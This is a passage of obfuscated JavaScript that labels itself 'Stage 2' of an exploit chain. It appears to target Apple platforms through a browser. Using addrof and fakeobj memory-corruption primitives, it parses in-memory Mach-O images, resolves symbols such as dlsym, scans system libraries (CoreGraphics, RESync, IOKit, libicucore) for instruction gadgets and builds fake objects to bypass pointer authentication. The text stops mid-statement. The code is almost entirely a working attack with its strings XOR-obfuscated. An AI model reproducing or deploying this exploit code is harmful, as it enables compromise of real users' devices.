let r = {};
window.log(`[Stage 2] Loaded evalCode`);
globalThis.moduleManager.evalCode("ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8", function() {
    let r = {};

    const x = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
        {
            N: G
        } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
        P = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
        {
            zn: F
        } = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0"),
        Z = F.Ln;
    window.log(`[Stage 2] Loaded modules`);

    function Y(t, r = !1) {
        const e = P.platformState.exploitPrimitive,
            n = e.read32FromInt64(t.H(16));
        let s = t.H(32),
            i = new x.Vt(0, 0),
            o = !0,
            h = !1,
            c = null,
            l = null,
            f = null,
            a = 0,
            u = null,
            d = null,
            w = null,
            g = null,
            m = !1;
        const E = [];
        for (let f = 0; f < n; f++) {
            const n = e.read32FromInt64(s),
                f = e.read32FromInt64(s.H(4));
            switch (n) {
                case 15:
                    m = !0;
                    break;
                case 50:
                    r && 1 === e.read32FromInt64(s.H(8)) && (w = !0, g = e.read32FromInt64(s.H(12)));
                    break;
                case 25: {
                    const n = {
                        Xe: e.readStringFromInt64(s.H(8), 16),
                        qe: e.readInt64FromInt64(s.H(24)),
                        Eo: e.readInt64FromInt64(s.H(24)),
                        Oo: e.readInt64FromInt64(s.H(32)),
                        Qe: e.readInt64FromInt64(s.H(40)),
                        zo: e.readInt64FromInt64(s.H(48)),
                        $o: e.read32FromInt64(s.H(56)),
                        qo: e.read32FromInt64(s.H(60)),
                        Mo: e.read32FromInt64(s.H(64)),
                        flags: e.read32FromInt64(s.H(68)),
                        Do: s.H(72),
                        Lo: {},
                        dump() {}
                    };
                    if (r)
                        for (let t = 0; t < n.Mo; t += 1) {
                            const r = n.Do.H(80 * t),
                                s = {
                                    Xe: e.readStringFromInt64(r.H(16), 16),
                                    Vo: e.readStringFromInt64(r.H(0), 16),
                                    qe: e.readInt64FromInt64(r.H(32)),
                                    Oo: e.readInt64FromInt64(r.H(40)),
                                    Qe: e.read32FromInt64(r.H(48)),
                                    dump() {}
                                };
                            n.Lo[s.Vo] = s
                        }
                    switch (E.push(n), n.Xe) {
                        case ([111, 111, 100, 117, 104, 100].map(x => {
                            return String.fromCharCode(x ^ 48);
                        }).join("")):
                            n.Qe.Et() ? o = !1 : l = t.sub(n.Qe), i = t.sub(n.qe);
                            break;
                        case ([105, 105, 122, 127, 120, 125, 115, 114, 127, 98].map(x => {
                            return String.fromCharCode(x ^ 54);
                        }).join("")):
                            u = n.qe.add(i).sub(n.Qe);
                            break;
                        case ([44, 44, 50, 38, 39, 59, 44, 48, 60, 61, 32, 39].map(x => {
                            return String.fromCharCode(x ^ 115);
                        }).join("")):
                            if (r) {
                                const t = n.Lo.__auth_got;
                                void 0 !== t && (d = t.qe.add(i))
                            }
                    }
                    break
                }
                case (4294967296 + (929916783 ^ -1217566899)):
                    h = !0, c = e.read32FromInt64(s.H(40)), a = e.read32FromInt64(s.H(44));
                    break;
                case (4294967296 + (1867658329 ^ -279825302)):
                    h = !0, c = e.read32FromInt64(s.H(8)), a = e.read32FromInt64(s.H(12))
            }
            s = s.H(f)
        }
        let _ = i;
        if (r && !o && !m) {
            const r = e.read32FromInt64(t.H(4));
            if (w && (1932683608 ^ 1915906388) === r && g >= (1466849650 ^ 1466259826)) {
                if (null === d) throw new Error("");
                let t = e.readInt64FromInt64(d).Dt();
                if (t.Et()) throw new Error("");
                for (t = t.Bt(t.it % (1699169646 ^ 1699173742));
                    (4294967296 + (1314404404 ^ -1330265349)) !== e.read32FromInt64(t);) t = t.Bt((1714972491 ^ 1714976587));
                const r = this.Xo(t);
                l = r.Ho.Zo, _ = r.Ho.Ko
            }
        }
        for (let t = 0; t < E.length; t++) {
            const r = E[t],
                e = r.qe;
            r.qe = e.add(i)
        }
        return h && c && (f = u.H(c)), new tt({
            Go: t,
            Jo: n,
            Qo: i,
            Yo: u,
            Zo: l,
            Ko: _,
            th: f,
            rh: a
        }, E)
    }
    r.ur = function() {
        return Y(P.zn.yn, !0)
    }, r.Xo = Y;
    class tt {
        constructor(t, r) {
            this.Ho = t, this.eh = r, this.nh = new Uint8Array([]), this.sh = !1
        }
        sr() {
            return new rt(this)
        }
        ar() {
            return new et(this)
        }
        ih(t) {
            const r = this.oh(([107].map(x => {
                return String.fromCharCode(x ^ 52)
            }).join("")) + (t));
            return r ? this.Ho.Go.H(r) : new x.Vt(0, 0)
        }
        oh(t) {
            if (!1 === this.sh) {
                this.sh = !0;
                const t = new Uint32Array(this.Ho.rh + 3 >> 2);
                for (let r = 0; r < t.length; r++) t[r] = P.platformState.exploitPrimitive.read32FromInt64(this.Ho.th.H(4 * r));
                this.nh = new Uint8Array(t.buffer)
            }
            const r = this.nh;
            let e = "",
                n = 0,
                s = !1;
            for (; !s;) {
                s = !0;
                let i = 0,
                    o = 0;
                do {
                    i += ((2004504407 ^ 2004504360) & r[n]) << o, o += 7
                } while ((1598192238 ^ 1598192366) & r[n++]);
                if (e === t && 0 !== i) {
                    n++;
                    let t = 0;
                    o = 0;
                    do {
                        t += ((2018992691 ^ 2018992716) & r[n]) << o, o += 7
                    } while ((1783716180 ^ 1783716308) & r[n++]);
                    return t
                }
                n += i;
                const h = r[n++];
                for (let i = 0; i < h; i++) {
                    let i = "";
                    for (; 0 !== r[n];) i += String.fromCharCode(r[n++]);
                    n++;
                    let h = 0;
                    o = 0;
                    do {
                        h += ((2053530479 ^ 2053530384) & r[n]) << o, o += 7
                    } while ((1936946514 ^ 1936946642) & r[n++]);
                    if (i.length && e + i === t.substr(0, e.length + i.length)) {
                        e += i, n = h, s = !1;
                        break
                    }
                }
            }
            return 0
        }
    }
    class rt {
        constructor(t) {
            this.hh = t, this.lh = this.hh.Ho.Go
        }
        ih(t) {
            const r = this.hh.oh(([109].map(x => {
                return String.fromCharCode(x ^ 50)
            }).join("")) + (t));
            return r ? this.hh.Ho.Go.H(r) : new x.Vt(0, 0)
        }
        fh(t) {
            const r = this.hh.oh(([57].map(x => {
                return String.fromCharCode(x ^ 102)
            }).join("")) + (t));
            if (!r) throw new Error("");
            return r ? this.hh.Ho.Go.H(r) : new x.Vt(0, 0)
        }
        ah(t) {
            return 0 !== this.hh.oh(([5].map(x => {
                return String.fromCharCode(x ^ 90)
            }).join("")) + (t))
        }
        dlsym(t) {
            const r = this.hh.oh("_" + t);
            if (!r) throw new Error("Stage2 rt.dlsym(" + t + "): symbol not found");
            return r ? this.hh.Ho.Go.H(r) : new x.Vt(0, 0)
        }
        uh(...t) {
            for (const r of t) try {
                return this.fh(r)
            } catch (t) {
                continue
            }
            throw new Error("")
        }
    }
    class et {
        constructor(t) {
            this.hh = t, this.dh = null, this.wh = this.hh.Ho.Go.yt()
        }
        ih(t) {
            const r = this.hh.oh(([25].map(x => {
                return String.fromCharCode(x ^ 70)
            }).join("")) + (t));
            return r ? this.wh + r : 0
        }
        uh(...t) {
            for (const r of t) try {
                return this.fh(r)
            } catch (t) {
                continue
            }
            throw new Error("")
        }
        ah(t) {
            return 0 !== this.hh.oh(([17].map(x => {
                return String.fromCharCode(x ^ 78)
            }).join("")) + (t))
        }
        fh(t) {
            const r = this.hh.oh(([51].map(x => {
                return String.fromCharCode(x ^ 108)
            }).join("")) + (t));
            if (!r) throw new Error("");
            return this.wh + r
        }
        dlsym(t) {
            const r = this.hh.oh("_" + t);
            if (!r) throw new Error("Stage2 et.dlsym(" + t + "): symbol not found");
            return this.wh + r
        }
        gh(t) {
            return {
                Xe: t.Xe,
                qe: t.qe.yt(),
                Eo: t.Eo.yt(),
                Oo: t.Oo.yt(),
                Qe: t.Qe.yt(),
                zo: t.zo.yt(),
                $o: t.$o,
                qo: t.qo,
                Mo: t.Mo,
                flags: t.flags,
                Do: t.Do.yt(),
                Lo: t.Lo
            }
        }
        mh(t) {
            return {
                Xe: t.Xe,
                Vo: t.Vo,
                qe: t.qe.yt(),
                Oo: t.Oo.yt(),
                Qe: t.Qe.yt()
            }
        }
        Eh(t) {
            for (let r = 0; r < this.hh.eh.length; r++)
                if (this.hh.eh[r].Xe === t) return this.gh(this.hh.eh[r]);
            return null
        }
        _h(t, r) {
            const e = this.Eh(t);
            if (null !== e) {
                if (0 !== Object.keys(e.Lo).length) {
                    const t = e.Lo[r];
                    return void 0 !== t ? this.mh(t) : null
                } {
                    let n = null;
                    for (let s = 0; s < e.Mo; s++) {
                        const i = e.Do + 80 * s,
                            o = t,
                            h = P.platformState.exploitPrimitive.readString(i, 16),
                            c = {
                                Xe: o,
                                Vo: h,
                                qe: P.platformState.exploitPrimitive.readInt64FromOffset(i + 32).add(this.hh.Ho.Qo),
                                Oo: P.platformState.exploitPrimitive.readInt64FromOffset(i + 40),
                                Qe: P.platformState.exploitPrimitive.readInt64FromOffset(i + 48)
                            };
                        r === h && (n = c), e.Lo[h] = c
                    }
                    return n ? this.mh(n) : null
                }
            }
            return null
        }
        bh(t, r) {
            const e = this.Eh(t);
            if (null !== e)
                for (let n = 0; n < e.Mo; n++) {
                    const s = e.Do + 80 * n,
                        i = t,
                        o = P.platformState.exploitPrimitive.readString(s, 16);
                    if (r === o) {
                        const t = {
                            Xe: i,
                            Vo: o,
                            qe: P.platformState.exploitPrimitive.readInt64FromOffset(s + 32).add(this.hh.Ho.Qo),
                            Oo: P.platformState.exploitPrimitive.readInt64FromOffset(s + 40),
                            Qe: P.platformState.exploitPrimitive.readInt64FromOffset(s + 48)
                        };
                        return this.mh(t)
                    }
                }
            return null
        }
        ph(t) {
            const r = this.Eh(t);
            if (!r) throw new Error("");
            return r
        }
        Sh() {
            return null === this.dh && (this.dh = new nt(this.hh.Ho.Ko.yt(), this.hh.Ho.Zo.yt())), this.dh
        }
        xh(t) {
            const r = this.ih(t);
            return 0 !== r ? P.platformState.exploitPrimitive.readInt64FromOffset(r) : new x.Vt(0, 0)
        }
        Ih(t) {
            const r = this.ph(([61, 61, 54, 39, 58, 54].map(x => {
                return String.fromCharCode(x ^ 98);
            }).join("")));
            return t - r.Eo + r.qe
        }
        Th(t) {
            const r = this.ih(t);
            return 0 !== r ? P.platformState.exploitPrimitive.readRawBigInt(r) : 0
        }
        yh(t, r) {
            const e = this.ih(t);
            return 0 !== e ? P.platformState.exploitPrimitive.readByte(e) : r
        }
        kh(t, r) {
            const e = this.Eh(t);
            if (null === e) throw new Error("");
            for (let t = 0; t < e.Oo; t += 8) {
                const n = e.qe + t;
                if (P.platformState.exploitPrimitive.read32(n) === r >>> 0 && P.platformState.exploitPrimitive.read32(n + 4) === r / 4294967296 >>> 0) return n
            }
            throw new Error("")
        }
        Oh(t, r) {
            const e = this.Eh(t);
            if (null === e) throw new Error("");
            const n = e.qe,
                s = e.qe + e.Oo;
            return r >= n && r < s
        }
        zh(t, r, e) {
            const n = this._h(t, r);
            if (null === n) throw new Error("");
            const s = n.qe,
                i = n.qe + n.Oo;
            return e >= s && e < i
        }
        Ph(t) {
            for (let r = 0; r < this.hh.eh.length; r++)
                if (this.Oh(this.hh.eh[r].Xe, t)) return !0;
            return !1
        }
        Uh(t, r) {
            const e = this.Eh(t);
            if (null === e) throw new Error("");
            for (let t = 0; t < e.Oo; t += 8)
                if (P.platformState.exploitPrimitive.readDoubleAsPointer(e.qe + t) === r) return e.qe + t;
            throw new Error("")
        }
        Ah(t, r) {
            const e = this.Eh(t);
            if (null === e) throw new Error("");
            for (let t = 0; t < e.Oo; t += 8)
                if (P.platformState.exploitPrimitive.readDoubleAsPointer(e.qe + t) === r) return P.platformState.exploitPrimitive.readInt64FromOffset(e.qe + t);
            throw new Error("")
        }
        $h(t, r, e) {
            const n = this.Eh(t);
            if (null === n) throw new Error("");
            const s = this.Eh(r);
            if (null === s) throw new Error("");
            for (let t = 0; t < s.Oo; t += 8) {
                const r = P.platformState.exploitPrimitive.readDoubleAsPointer(s.qe + t);
                if (r >= n.qe && r < n.qe + n.Oo && !0 === e(r, P.platformState.exploitPrimitive.readInt64FromOffset(s.qe + t))) break
            }
        }
        qh(t, r) {
            const e = this.Eh(t);
            if (null === e) throw new Error("");
            for (let t = 0; t < e.Oo; t += 4) {
                const n = e.qe + t;
                if (!0 === r(n, P.platformState.exploitPrimitive.read32(n))) break
            }
        }
        Rh(t, r) {
            const e = this.Eh(t);
            if (null === e) throw new Error("");
            for (let t = 0; t < e.Oo; t += 8) {
                const n = e.qe + t;
                if (!0 === r(Z.ut(n))) break
            }
        }
        Ch(t) {
            for (const r of this.hh.eh) {
                const e = Z.ut(r.qe),
                    n = Z.ut(r.qe).H(x._(r.Oo));
                if (t.Pi(e) && t.Si(n)) return r
            }
            return null
        }
    }
    class nt {
        constructor(t, r) {
            this.Mh = t, this.Dh = r, this.Lh = !1, this.Bh = {}, this.images = this.Nh()
        }
        Vh() {
            return P.platformState.exploitPrimitive.readString(this.Dh)
        }
        Xh() {
            return ([54, 43, 62, 54, 13, 36, 99, 114, 114, 51, 32, 63, 100, 102, 55].map(x => {
                return String.fromCharCode(x ^ 82);
            }).join("")) === this.Vh()
        }
        Zh() {
            return this.Mh
        }
        Nh() {
            const t = [];
            if (!this.Vh().startsWith(([13, 16, 5, 13].map(x => {
                    return String.fromCharCode(x ^ 105);
                }).join("")))) throw new Error("");
            let r = P.platformState.exploitPrimitive.read32(this.Dh + 24),
                e = P.platformState.exploitPrimitive.read32(this.Dh + 28);
            if (0 === r && 0 === e && (this.Lh = !0, r = P.platformState.exploitPrimitive.read32(this.Dh + (1282692186 ^ 1282692506)), e = P.platformState.exploitPrimitive.read32(this.Dh + (946890306 ^ 946890630)), 0 === r && 0 === e)) throw new Error("");
            for (let n = 0; n < e; n++) {
                const e = this.Dh + r + 32 * n,
                    s = P.platformState.exploitPrimitive.readDoubleAsPointer(e) + this.Mh,
                    i = P.platformState.exploitPrimitive.read32(e + 24),
                    o = P.platformState.exploitPrimitive.readString(this.Dh + i);
                t.push({
                    address: s,
                    path: o
                })
            }
            return t
        }
        jh() {
            const t = [];
            for (const r of this.images) t.push(r.path);
            return t
        }
        Fh(t, r) {
            return this.Hh(t).fh(r)
        }
        Kh(t) {
            for (const r of this.images) try {
                return this.Hh(r.path).fh(t)
            } catch (t) {
                continue
            }
            throw new Error("")
        }
        Gh(t) {
            for (let r = 0; r < this.images.length; r++)
                if (-1 !== this.images[r].path.indexOf(t)) return this.images[r].address;
            return 0
        }
        Hh(t) {
            if (void 0 === this.Bh[t]) {
                const r = this.Gh(t);
                if (0 === r) return null;
                this.Bh[t] = Y(x.Vt.ut(r)).ar()
            }
            return this.Bh[t]
        }
        Jh(t) {
            const r = this.Hh(t);
            if (null === r) throw new Error("");
            return r
        }
        Qh(...t) {
            for (const r of t) try {
                return this.Jh(r)
            } catch (t) {}
            throw new Error("")
        }
    }
    return r;
});
window.log(`[Stage 2] starting PAC bypass`);
const x = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
    {
        N: G,
        tn: W,
        nn: C,
        Vt: m,
        U: j,
        An: S,
        vn: O,
        v: o,
        I: u,
        B: s
    } = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
    P = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");
window.log(`[Stage 2] New modules loaded`);

class it {
    constructor() {
        this.tc = null, this.ic = null, this.cc = !1
    }
    da(c, o) {
        return new x.Vt(0, 0)
    }
    er(c, o) {
        return new x.Vt(0, 0)
    }
    wa(c, o) {
        return new x.Vt(0, 0)
    }
    ha(c, o) {
        return new x.Vt(0, 0)
    }
}
r.sc = it;
class ct {
    constructor(c) {
        this.lc = c
    }
    oc(c) {
        let o = 0;
        const i = [];
        for (let t = 0; t < c.length; t++) {
            const a = c[t]; - (1098461234 ^ 830025778) == ((4294967296 + (959279473 ^ -1506971279)) & a) ? (i.push(-(1097741133 ^ 563203244)), o++) : o && -(1697926471 ^ 1676954951) == ((4294967296 + (1835622770 ^ -1834393230)) & a) ? i.push(-(959670106 ^ 957127515)) : ((4294967296 + (2003204679 ^ -1956218297)) & a) >>> 0 == (863593306 ^ 662266714) ? i.push(-(2016949611 ^ 2084058475)) : i.push(-1)
        }
        return {
            ac: o,
            mask: i
        }
    }
    hc(c) {
        const o = this.lc.Jh(c),
            i = new Set([(4294967296 + (1951289186 ^ -1569634435)), (4294967296 + (1683649092 ^ -1301972357)), (4294967296 + (1131951446 ^ -1790493431)), (4294967296 + (895831092 ^ -480623541)), (4294967296 + (1917215054 ^ -1535546927)), (4294967296 + (1666140978 ^ -1250933875)), (4294967296 + (1700417619 ^ -1285203828)), (4294967296 + (762729803 ^ -79077964))]),
            t = [];
        o.qh(([6, 6, 13, 28, 1, 13].map(x => {
            return String.fromCharCode(x ^ 89);
        }).join("")), ((c, o) => {
            i.has(o) && t.push([c, o])
        })), t.length
    }
    dc(c, o, i) {
        const t = this.lc.Jh(c),
            {
                ac: a,
                mask: l
            } = this.oc(o);
        let b = null,
            I = null,
            s = null;
        if (!0 === i ? (t.$h("__TEXT", !0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.PgkJIA ? "__AUTH_CONST" : "__DATA_CONST", ((c, i) => {
                let t = c;
                for (let c = 0; c < o.length; c++) {
                    const i = P.platformState.exploitPrimitive.read32(t);
                    if ((o[c] & l[c]) != (i & l[c])) return !1;
                    t += ((4294967296 + (895838583 ^ -916100745)) & i) >>> 0 == (1466381158 ^ 1130836838) ? i << 6 >> 4 : 4
                }
                return b = i, !0
            })), b && (I = b.Dt().yt(), s = b)) : (t.qh(([114, 114, 121, 104, 117, 121].map(x => {
                return String.fromCharCode(x ^ 45);
            }).join("")), ((c, i) => {
                let t = !0;
                for (let i = 0; i < o.length; i++)
                    if ((o[i] & l[i]) != (P.platformState.exploitPrimitive.read32(c + 4 * i) & l[i])) return t = !1, !1;
                if (t) return b = c, !0
            })), I = b), null === b) throw new Error("");
        let d = [];
        a && (d = this.bc(I, !1, a));
        let y = 0;
        if (!1 === i)
            for (let c = 0; c < (943940678 ^ 943944774); c += 4) {
                if ((4294967296 + (1802791763 ^ -1099478996)) === P.platformState.exploitPrimitive.read32(b - c)) {
                    y = b - c;
                    break
                }
            }
        return {
            Ic: b,
            ec: y,
            gc: d,
            yc: s
        }
    }
    Cc(c, o) {
        for (const i of c) try {
            return this.dc(i, o, !0)
        } catch (c) {}
        throw new Error("")
    }
    uc(c, o) {
        for (const i of c) try {
            return this.dc(i, o, !1)
        } catch (c) {}
        throw new Error("")
    }
    rc(c) {
        for (const o of this.lc.jh()) try {
            return this.dc(o, c, !1)
        } catch (c) {}
        throw new Error("")
    }
    nc(c) {
        for (const o of this.lc.jh()) try {
            return this.dc(o, c, !0)
        } catch (c) {}
        throw new Error("")
    }
    bc(c, o, i = -1, t = !1) {
        const a = [];
        let l = !1;
        const b = [];
        for (let c = 0; c < 31; c++) b[c] = 0;
        for (let i = 0; i < globalThis.moduleManager.getModuleByName(([101, 96, 98, 98, 109, 55, 53, 103, 54, 101, 97, 101, 109, 54, 53, 102, 53, 108, 50, 96, 100, 54, 49, 102, 108, 99, 50, 98, 96, 98, 48, 96, 48, 99, 97, 109, 103, 49, 54, 100].map(x => {
                return String.fromCharCode(x ^ 84);
            }).join(""))).platformState.versionFlags.KrBQWx; i++) {
            const I = c + 4 * i,
                s = P.platformState.exploitPrimitive.read32(I);
            if ((4294967296 + (1867789176 ^ -1190445945)) === s || (4294967296 + (1296253527 ^ -1692647017)) === s) {
                l = !0;
                break
            }
            if (((4294967296 + (1464688462 ^ -1471324338)) & s) >>> 0 == (1764912242 ^ 2100456562)) {
                if (t) {
                    l = !0;
                    break
                }
            } else if (((4294967296 + (1937274723 ^ -327649437)) & s) >>> 0 == (4294967296 + (1248289098 ^ -630759094))) {
                const c = (s << 8 >> 13 << 2 | s >> 29 & 3) << 12;
                b[31 & s] = I - I % (1346530659 ^ 1346534755) + c
            } else if (((4294967296 + (1882207818 ^ -1880082870)) & s) >>> 0 == (4294967296 + (1316251250 ^ -1221302670))) {
                const c = s >> 5 & 31,
                    o = s >> 10 & (1481665138 ^ 1481663885);
                b[c] && a.push(b[c] + 8 * o)
            } else if (o && ((4294967296 + (1114664778 ^ -1116704950)) & s) >>> 0 == (4294967296 + (1264994409 ^ -630830999))) {
                const c = s >> 5 & 31,
                    o = s >> 10 & (1732666417 ^ 1732668366);
                b[c] && (a.push(b[c] + o), b[c] = 0)
            }
        }
        if (!l) throw new Error("");
        if (i > -1 && a.length !== i) throw new Error("");
        return a
    }
    Kc(c, o, i, t) {
        const a = this.lc.Jh(c),
            {
                ac: l,
                mask: b
            } = this.oc(o);
        let I = null,
            s = null,
            d = null;
        if (!0 === i ? (a.$h("__TEXT", t, ((c, i) => {
                let t = c;
                for (let c = 0; c < o.length; c++) {
                    const i = P.platformState.exploitPrimitive.read32(t);
                    if ((o[c] & b[c]) != (i & b[c])) return !1;
                    t += ((4294967296 + (892613940 ^ -919325388)) & i) >>> 0 == (1937076037 ^ 1735749445) ? i << 6 >> 4 : 4
                }
                return I = i, !0
            })), I && (s = I.Dt().yt(), d = I)) : (a.qh(([58, 58, 49, 32, 61, 49].map(x => {
                return String.fromCharCode(x ^ 101);
            }).join("")), ((c, i) => {
                let t = !0;
                for (let i = 0; i < o.length; i++)
                    if ((o[i] & b[i]) != (P.platformState.exploitPrimitive.read32(c + 4 * i) & b[i])) return t = !1, !1;
                if (t) return I = c, !0
            })), s = I), null === I) throw new Error("");
        let y = [];
        l && (y = this.bc(s, !1, l));
        let r = 0;
        if (!1 === i)
            for (let c = 0; c < (1146647130 ^ 1146643034); c += 4) {
                if ((4294967296 + (1229616198 ^ -1672915143)) === P.platformState.exploitPrimitive.read32(I - c)) {
                    r = I - c;
                    break
                }
            }
        return {
            Ic: I,
            ec: r,
            gc: y,
            yc: d
        }
    }
    mc(c, o, i) {
        for (const t of c) try {
            return this.Kc(t, o, !0, i)
        } catch (c) {}
        throw new Error("")
    }
}
const cc = globalThis.moduleManager.getModuleByName("ba712ef6c1bf20758e69ab945d2cdfd51e53dcd8");
class oc extends it {
    da(c, o) {
        return this.Ka(this.La, c, o)
    }
    er(c, o) {
        return this.Ka(this.Xa, c, o)
    }
    wa(c, o) {
        return this.Ka(this.Ma, c, o)
    }
    ha(c, o) {
        return this.Ka(this.Ga, c, o)
    }
    pacda(c, o) {
        return this.da(c, o)
    }
    pacia(c, o) {
        return this.er(c, o)
    }
    autda(c, o) {
        return this.wa(c, o)
    }
    autia(c, o) {
        return this.ha(c, o)
    }
    Mc() {
        const c = this.Tc,
            o = P.platformState.exploitPrimitive.fakeobj(c);
        window.log(`[Stage 2] fakeobj TC o: ${o}`)
        if (o % 4096 != 0) throw new Error("[Stage 2] fakeobj TC o % 4096 != 0");
        const i = x.Vt.ut(o).Ut();
        window.log(`[Stage 2]  i o: ${i}`)
        return c[0] = 4277009103, c[1] = 16777228, c[2] = 2, c[4] = 3, c[5] = 272, c[8] = 25, c[9] = 152, c[10] = 1163157343, c[11] = 21592, c[24] = 1, c[34] = i.it, c[35] = i.et, c[36] = 4294901760, c[37] = 127, c[42] = 2147484672, c[46] = 25, c[47] = 72, c[48] = 1229741919, c[49] = 1145391950, c[50] = 21577, c[52] = 304, c[56] = 304, c[64] = 2147483682, c[65] = 48, c[74] = 304, c[75] = 2048, c[76] = 1633616128, c[77] = 198144, c
    }
    constructor() {
        super(), this.cc = !0;
        let c = 64,
            o = 16;
        !0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.QwxZcT && (c += 4, o -= 4);
        let i = (758410840 ^ 758411176);
        !0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.QwxZcT && (i = (1448498021 ^ 1448497197));
        let t = 72,
            a = 76;
        !0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.QwxZcT && (t = 80, a = 84), this.Tc = new Uint32Array(65536), x.D(this.Tc), this.lc = P.cr().Sh(), this.Pc = new ct(this.lc);
        window.log(`[Stage 2] libdyld.dylib`);
        const l = this.lc.Jh("libdyld.dylib"),
            b = this.lc.Jh("libSystem.B.dylib"),
            I = this.lc.Jh("libxml2.2.dylib"),
            s = P.platformState.exploitPrimitive,
            d = I.fh("xmlSAX2GetPublicId");
        if (3531603968 !== s.read32(d) || 3596551104 !== s.read32(d + 4)) throw new Error("3531603968 !== s.read32(d) || 3596551104 !== s.read32(d + 4)");
        let y;
        y = I.Ah("__AUTH", d);
        window.log(`[Stage 2] dlsym`);
        const r = l.fh("dlsym"),
            g = b.Ah(globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.PgkJIA ? "__AUTH_CONST" : "__DATA_CONST", r),
            C = [],
            e = function(c) {
                C.push(c)
            };
        this.Da = C;
        e({
            x: null
        });
        const u = {};
        e(u);
        const n = function(c) {
            const o = new Uint8Array(c),
                i = s.fakeobj(o);
            return u[i] = o, i
        };
        let h = null;
        window.log(`[Stage 2] CoreGraphics first entry`);

        try {
            h = this.Pc.mc(["/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics"], [2852193248, 402650939, 3019899104, 4181725186, 3019899042, 4181722120, 4181727233, 2852652000, 3592357983], "__AUTH_CONST")
        } catch (c) {
            h = this.Pc.mc(["/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics"], [3019899073, 4181725218, 3019899010, 4181722144, 4181727265, 3592357983], "__AUTH_CONST")
        }
        let K = null;
        window.log(`[Stage 2] CoreGraphics second entry`);

        try {
            K = this.Pc.mc(["/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics"], [4181730304, 402609294, 3019899104, 4181723139, 3019899043, 4181722120, 4181727234, 2852652000, 3592358015], ([44, 44, 50, 38, 39, 59, 44, 48, 60, 61, 32, 39].map(x => {
                return String.fromCharCode(x ^ 115);
            }).join("")))
        } catch (c) {
            K = this.Pc.mc(["/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics", "/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics"], [4181730312, 3019899080, 4181723395, 3019899011, 4181722368, 4181727490, 3592358015], "__AUTH_CONST")
        }
        window.log(`[Stage 2] RESync first entry`);

        const m = this.Pc.mc(["/System/Library/PrivateFrameworks/RESync.framework/RESync", "/System/Library/PrivateFrameworks/RESync.framework/Versions/A/RESync"], [3573752703, 2847821812, 2835446781, 2432713725, 2852127731, 2953134088, 4182086920, 2852193248, 3594455327, 2852127732, 3036676224, 2953134088, 4182088968, 3594455327, 4177529460, 2839641085, 2831306740, 3596554239], "__AUTH"),
            L = m.gc[0],
            p = m.gc[1],
            X = this.Pc.mc(["/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit"], [2839676936, 4181727233, 2852652000, 3592357983], "__AUTH_CONST"),
            T = this.Pc.mc(["/usr/lib/libicucore.A.dylib"], [4181723171, 4181721120, 1384120321, 1384128482, 3592358015], "__AUTH_CONST");
        let M = null;
        window.log(`[Stage 2] IOKit first entry`);

        if (P.cr().qh("__AUTH_CONST", ((c, o) => {
                if (32 === o) {
                    const o = c - 244;
                    if (o % 8 != 0 || s.read32(o + 4) >= 128 || s.read32(o + 12) >= 128) return !1;
                    const i = s.readRawBigInt(o),
                        t = s.readRawBigInt(o + 8);
                    return 0 !== i && 0 !== t && ("CallbackObject" === s.readString(i) && (M = o, !0))
                }
                return !1
            })), null === M) throw new Error("");
        const G = function(c) {
                let o;
                window.log(`[Stage 2] __DATA_DIRTY __dyld4`);

                if (o = c._h("__DATA_DIRTY", "__dyld4"), null === o) throw new Error("");
                return P.platformState.exploitPrimitive.readRawBigInt(o.qe)
            }(l),
            k = function(c) {
                const o = P.platformState.exploitPrimitive.readDoubleAsPointer(c),
                    i = P.platformState.exploitPrimitive.readDoubleAsPointer(o);
                let t = i - i % 4096;
                for (; 4277009103 !== P.platformState.exploitPrimitive.read32(t);) t -= 4096;
                return cc.Xo(x.Vt.ut(t))
            }(G),
            D = function(c) {
                let o = null;
                window.log(`[Stage 2] c.ar().qh("__TEXT")`);

                if (c.ar().qh("__TEXT", ((c, i) => 3670081792 === i && 3596551104 === s.read32(c + 4) && (o = c, !0))), null === o) throw new Error("");
                return o
            }(k),
            w = D + 8;
        if (3670083840 !== s.read32(w) || 3596551104 !== s.read32(w + 4)) throw new Error("1");
        const Z = D + 16;
        if (3670082816 !== s.read32(Z) || 3596551104 !== s.read32(Z + 4)) throw new Error("2");
        const S = D + 24;
        if ((4294967296 + (1348958007 ^ -1968801225)) !== s.read32(S) || (4294967296 + (1651781976 ^ -1272237416)) !== s.read32(S + 4)) throw new Error("3");
        window.log(`[Stage 2] this.Za Lg4V8D platformFlags`);
        this.Za = null, !0 === globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0").platformState.versionFlags.Lg4V8D && (this.Za = P.cr().fh("g_config"));
        window.log(`[Stage 2] Lg4V8D g_config`);

        const A = {
                Na: 0,
                Fr: 1,
                Lr: 2,
                Rr: 3,
                qr: 4,
                za: 5,
                Ha: 6,
                Qa: 7,
                Va: 8,
                Wa: 9
            },
            N = {
                Ra: 0
            },
            z = s.addrof(A),
